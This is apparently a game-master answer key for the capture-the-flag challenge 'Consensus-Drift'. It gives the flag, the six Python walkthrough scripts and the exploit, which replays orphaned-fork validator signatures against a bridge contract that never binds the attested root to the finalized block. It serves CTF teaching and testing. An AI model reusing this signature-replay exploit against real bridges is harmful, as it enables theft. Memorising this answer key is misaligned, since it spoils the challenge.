# Consensus-Drift — reference solution (GM only)

**Flag:** `flag{0rphan_ckpt_r3played_p4st_th3_dr1ft}`

**One-line summary:** the convoy's on-chain light client (`ConvoyBridge`) finalizes a relayed block
on a supermajority of validator attestations over `(height, attestedRoot)` but **never binds
`attestedRoot` to the block it finalizes**. The offline node databases contain a **drifted (lost)
fork** whose supermajority-signed checkpoint sits at a height **beyond** the bridge's finalized tip.
Reuse those harvested checkpoint votes as attestations on a forged block that carries the unlock
record, satisfy the header proof-of-work, and the bridge finalizes it — releasing the flag from the
dispenser.

## What the player is given (`dist/`)

- `convoy/node-01.db … node-07.db` — 7 node databases (custom binary, ~1.1 MB total).
- **No format documentation.** The node DB wire format is intentionally undocumented in the handout;
  reverse-engineering it from the raw bytes is part of the challenge. (The GM reference for the
  format is `src/WIRE_FORMAT.md`, which is **not** shipped.)
- `ConvoyBridge.sol` — source of the on-chain bridge.
- A live instance: JSON-RPC (bridge deployed) + a `nc` flag dispenser.

Neither the wire format nor the finality/fork-choice semantics are given — the player reconstructs
both, which is fair because every step **self-verifies** against the live contract or the data itself
(validator addresses must match `isValidator`, a vote signature must `ecrecover` to a known
validator, blocks hash-chain).

## The solution is the walkthrough

There is no monolithic solver. The **reference solution is the six numbered scripts in
`solution/walkthrough/`**, run in order (`01_recon.py … 06_exploit.py`) — each is one step of the
intended player path from raw handout to flag, and together they double as the GM walkthrough. The
last one, `06_exploit.py`, is a self-contained end-to-end solve (it re-does the parse/aggregate/grind
and finalizes), so it alone recovers the flag against a fresh instance.

Every script reads **only** `dist/` + the live endpoints — none touches `src/genesis.json` or any
validator private key. The whole point is that the exploit needs neither.

## Environment / tooling

On the GM Windows box there is no local foundry/solc and the native Python EVM wheels don't build
(see the `evm-toolchain-windows` memo), so use **Docker anvil + a Python venv**. The exact package
set these scripts need is pinned in `requirements.txt` at the challenge root:

```bash
# one-time venv (CPython 3.13 or 3.14; all deps are pure-Python wheels, no MSVC needed)
python -m venv .venv && ./.venv/Scripts/pip install -r requirements.txt   # Windows
# python -m venv .venv && ./.venv/bin/pip install -r requirements.txt     # Linux / macOS

# bring up an instance to solve against (low PoW for a fast check)
FLAG='flag{0rphan_ckpt_r3played_p4st_th3_dr1ft}' POW_BITS=16 docker compose up -d
```

Run every command below from the challenge root. A fresh instance is needed per solve — the exploit
finalizes the chain, so re-run `docker compose down && docker compose up -d` to reset.

---

## Guided walkthrough

### Step 1 — Recon: read the live target  (`walkthrough/01_recon.py`)

Understand the win before touching the blobs. The dispenser advertises the bridge address; the
bridge's public getters give the concrete numbers.

```python
import socket
from web3 import Web3

def read_dispenser(host="127.0.0.1", port=9000, timeout=5):
    s = socket.create_connection((host, port), timeout=timeout); s.settimeout(timeout)
    out = b""
    try:
        while True:
            b = s.recv(4096)
            if not b: break
            out += b
    except Exception: pass
    return out

banner = read_dispenser(); print(banner.decode())
bridge_addr = next(t for t in banner.split() if t.startswith(b"0x") and len(t) == 42).decode()

w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
abi = [{"inputs": [], "name": n, "outputs": [{"type": t}], "stateMutability": "view", "type": "function"}
       for n, t in [("finalizedHeight","uint256"),("threshold","uint256"),("powTarget","uint256"),
                    ("UNLOCK_RECORD","bytes32"),("finalizedHash","bytes32"),("validatorCount","uint256")]]
c = w3.eth.contract(address=Web3.to_checksum_address(bridge_addr), abi=abi)
for n in ["finalizedHeight","threshold","validatorCount","powTarget","finalizedHash","UNLOCK_RECORD"]:
    v = getattr(c.functions, n)().call()
    print(f"{n:16} =", v if isinstance(v, int) else "0x"+v.hex())
```

Reading `ConvoyBridge.sol` gives the **win condition** and the four **gates** on `submitBlock`:

- **Win:** `solved` flips true when a finalized header has `recordHash == UNLOCK_RECORD`.
- **Gate 1:** `h.height > finalizedHeight` (from recon, `finalizedHeight = 1400`).
- **Gate 2:** `h.parent == finalizedHash`.
- **Gate 3:** `uint256(headerHash(h)) < powTarget` (proof-of-work; default target `2^232` = 24 bits).
- **Gate 4:** `≥ threshold` (=5) **distinct** validator sigs over
  `attestationDigest(h.height, attestedRoot) = keccak256(abi.encode(h.height, attestedRoot))`, sorted
  strictly ascending by signer address.

Gates 1–3 you fully control. Gate 4 is the whole challenge: you need five validator signatures but
have no keys — so they must already exist in the offline data.

### Step 2 — Reverse the container format  (`walkthrough/02_reverse_format.py`)

No spec is shipped. Hexdump `node-01.db`: bytes 0–3 are ASCII `CVND` (a magic), so it's a structured
container. Diffing two files' headers shows byte 5 changes → node id. The body is length-framed
records; the natural guess `type:1 + length:3(LE) + payload` is **self-checking** — walk it and see
if you consume exactly `rec_count` records and land on EOF.

```python
import struct, collections
data = open("dist/convoy/node-01.db", "rb").read()
assert data[:4] == b"CVND"
rec_count = struct.unpack("<I", data[8:12])[0]     # bytes 8-11: u32 record count
off, n, hist = 12, 0, collections.Counter()
while off < len(data):
    rtype = data[off]; length = int.from_bytes(data[off+1:off+4], "little")
    off += 4 + length
    hist[(rtype, length)] += 1; n += 1
print("rec_count", rec_count, "walked", n, "EOF", off == len(data))
for k, cnt in sorted(hist.items()): print("  type", k[0], "len", k[1], "x", cnt)
```

Result: lands exactly on EOF, and three record types — **type 0 ×1 (173 B)** genesis, **type 1 ×1400
(113 B)** blocks, **type 2 ×30 (105 B)** votes. (30 votes in *this* file; different nodes hold
different subsets — that matters in Step 5.)

### Step 3 — Decode payloads + confirm the validators  (`walkthrough/03_decode_and_verify.py`)

`173 = 1 + 7×20 + 32` → GENESIS = `count(1) · 7×20-byte address · 32-byte root`. Extract the
addresses and confirm each against the live contract's `isValidator` (the oracle: all seven return
`True`, proving the parse and handing you the validator set).

```python
data = open("dist/convoy/node-01.db", "rb").read()
off = 12; length = int.from_bytes(data[off+1:off+4], "little"); p = data[off+4:off+4+length]
count = p[0]
addrs = ["0x"+p[1+20*i:1+20*(i+1)].hex() for i in range(count)]

isval = {"inputs":[{"type":"address"}],"name":"isValidator","outputs":[{"type":"bool"}],
         "stateMutability":"view","type":"function"}
cv = w3.eth.contract(address=Web3.to_checksum_address(bridge_addr), abi=[isval])
for a in addrs:
    print(a, "->", cv.functions.isValidator(Web3.to_checksum_address(a)).call())   # all True
```

VOTE (105 B): the trailing 65 bytes end in `0x1b`/`0x1c` (an ECDSA `v`), so `105 = 8 + 32 + 65` →
`checkpoint_num(8, LE) · checkpoint_root(32) · signature(65)`. Printing `checkpoint_num` for several
votes yields multiples of 200 (checkpoint heights), confirming the field and the little-endian read.

### Step 4 — Recover the vote digest  (`walkthrough/04_recover_digest.py`)

Votes aren't tagged with a signer and the format never says *what* was signed. Reverse it with the
oracle — the recovered address must be a known validator — by trying a few plausible constructions.
The tell is in the contract: `attestationDigest = keccak256(abi.encode(height, root))`. Try that
shape first.

```python
from eth_account import Account
from eth_utils import keccak
from eth_abi import encode as abi_encode
# vote fields from Step 3: cnum, croot, and (v, r, s) from the 65-byte signature
candidates = {
    "keccak(root)":                        keccak(croot),
    "keccak(cnum_LE8 || root)":            keccak(cnum.to_bytes(8,"little") + croot),
    "keccak(cnum_BE8 || root)":            keccak(cnum.to_bytes(8,"big") + croot),
    "keccak(abi.encode(uint256,bytes32))": keccak(abi_encode(["uint256","bytes32"], [cnum, croot])),
}
for name, d in candidates.items():
    a = Account._recover_hash(d, vrs=(v, r, s)).lower()
    print(name, "->", a, "<-- validator!" if a in validators else "")
```

Only `keccak(abi.encode(uint256, bytes32))` lands on a validator — and that is **byte-for-byte
`attestationDigest(cnum, croot)`**. There is no domain separation between a convoy checkpoint vote
and a bridge finality attestation: **every vote in these files is already a valid `submitBlock`
attestation** for a block at `height = cnum`, `attestedRoot = croot`. That is the answer to Gate 4.

### Step 5 — Find the orphan checkpoint  (`walkthrough/05_find_orphan.py`)

The reused votes must clear Gate 1 (`cnum > 1400`) **and** Gate 4 (`≥ 5` distinct validators). No
single file qualifies — canonical checkpoints (200…1400) are all `≤ 1400`, and the votes for the one
checkpoint that *does* qualify are split across the drifted nodes. Parse **all seven**, recover each
signer with the Step-4 digest, and group by `(cnum, croot)`.

```python
import glob, collections
per_ckpt = collections.defaultdict(dict)          # (cnum, croot) -> {signer: (v,r,s)}
validators = None
for path in sorted(glob.glob("dist/convoy/node-*.db")):
    data = open(path, "rb").read(); off = 12
    while off < len(data):
        rt = data[off]; ln = int.from_bytes(data[off+1:off+4], "little")
        p = data[off+4:off+4+ln]; off += 4 + ln
        if rt == 0 and validators is None:
            validators = set("0x"+p[1+20*i:1+20*(i+1)].hex() for i in range(p[0]))
        elif rt == 2:
            cnum, croot, sig = int.from_bytes(p[0:8],"little"), p[8:40], p[40:105]
            v, r, s = sig[64], int.from_bytes(sig[0:32],"big"), int.from_bytes(sig[32:64],"big")
            dg = keccak(abi_encode(["uint256","bytes32"], [cnum, croot]))
            signer = Account._recover_hash(dg, vrs=(v, r, s)).lower()
            if signer in validators: per_ckpt[(cnum, croot)][signer] = (v, r, s)

F0, THRESHOLD = 1400, 5
for (cnum, croot), sigs in sorted(per_ckpt.items()):
    print(cnum, len(sigs), "ahead" if cnum > F0 else "-", "quorum" if len(sigs) >= THRESHOLD else "-")
```

Exactly one row is both ahead of the tip and at quorum: **checkpoint 1500, 5 distinct validators**
(scattered across nodes 2/3/5/6). That is the "orphaned salvage manifest" — it won a supermajority on
a fork that lost, so the bridge is still stuck at 1400, blind to it, but the signatures are real.

### Step 6 — The crux + exploit  (`walkthrough/06_exploit.py`)

`submitBlock(h, attestedRoot, atts)` checks the five attestations against
`attestationDigest(h.height, attestedRoot)` and then finalizes `h`, setting `solved` if
`h.recordHash == UNLOCK_RECORD`. **It never requires `h.stateRoot == attestedRoot`, or that
`attestedRoot` relates to `h` at all.** Finality is not bound to the block: the validators authorized
a `(height, root)` pair, but the block that actually gets finalized is a separate object you control.
So staple the orphan's five votes onto a forged header carrying the unlock record.

```python
# per_ckpt from Step 5; read F0/threshold/powTarget/UNLOCK_RECORD/finalizedHash live (Step 1);
# compile dist/ConvoyBridge.sol for the ABI; sender = anvil dev acct 0.
(cnum, croot), sigs = next(kv for kv in per_ckpt.items() if kv[0][0] > F0 and len(kv[1]) >= THRESH)

hdr = {"height": cnum, "parent": PARENT, "stateRoot": croot, "recordHash": UNLOCK,
       "timestamp": 1730000000, "extra": keccak(b"drift")[:32], "nonce": 0}

# PoW: keccak(abi.encode(the 7 header words)) < powTarget. All fields are 32-byte words, so
# precompute the first six and grind only the trailing nonce word.
prefix = (hdr["height"].to_bytes(32,"big") + hdr["parent"] + hdr["stateRoot"]
          + hdr["recordHash"] + hdr["timestamp"].to_bytes(32,"big") + hdr["extra"])
n = 0
while int.from_bytes(keccak(prefix + n.to_bytes(32,"big")), "big") >= TARGET: n += 1
hdr["nonce"] = n

# attestations sorted ascending by signer address (the distinctness check)
atts = [(v, r.to_bytes(32,"big"), s.to_bytes(32,"big"))
        for a, (v, r, s) in sorted(sigs.items(), key=lambda kv: int(kv[0], 16))]

htuple = (hdr["height"], hdr["parent"], hdr["stateRoot"], hdr["recordHash"],
          hdr["timestamp"], hdr["extra"], hdr["nonce"])
# bridge.functions.submitBlock(htuple, croot, atts) -> send -> solved() == True -> read dispenser
```

At the default 24-bit PoW the grind is ~1–2 min in Python / seconds optimized. After
`submitBlock` returns `status 1` and `solved() == True`, the dispenser releases the flag.

**Adversarial (why naive attempts fail):** fewer than 5 sigs → `quorum: below supermajority`;
replaying one validator 5× → `sig: unsorted or duplicate signer`; a canonical checkpoint `≤ 1400` →
`stale: not ahead of finalized tip`; self-generated keys → `sig: not an authority`.

---

## Verifying end-to-end

`06_exploit.py` is the end-to-end solve on its own, so `/verify-challenge` (and any GM smoke test)
just runs it against a fresh instance:

```bash
FLAG='flag{0rphan_ckpt_r3played_p4st_th3_dr1ft}' POW_BITS=16 docker compose up -d
./.venv/Scripts/python solution/walkthrough/06_exploit.py
# -> orphan checkpoint: cnum=1500 ... / PoW satisfied ... / submitBlock status: 1  solved: True
# -> "Sealed record released: flag{...}"
```

## Why this resists an LLM shortcut

The difficulty is execution, not recall: a bespoke ~1.1 MB binary format that must be parsed with
real code (too large to paste), vote material that must be aggregated across seven disagreeing files,
a checkpoint whose eligibility depends on the **live** finalized tip, an emergent missing-bind
consensus flaw (not a named one-liner like nonce reuse), a proof-of-work that must actually be ground
out, and a per-team live target the exploit has to be run against. A model can describe the ideas; it
can't parse the blobs, grind the PoW, or drive the instance for the solver.
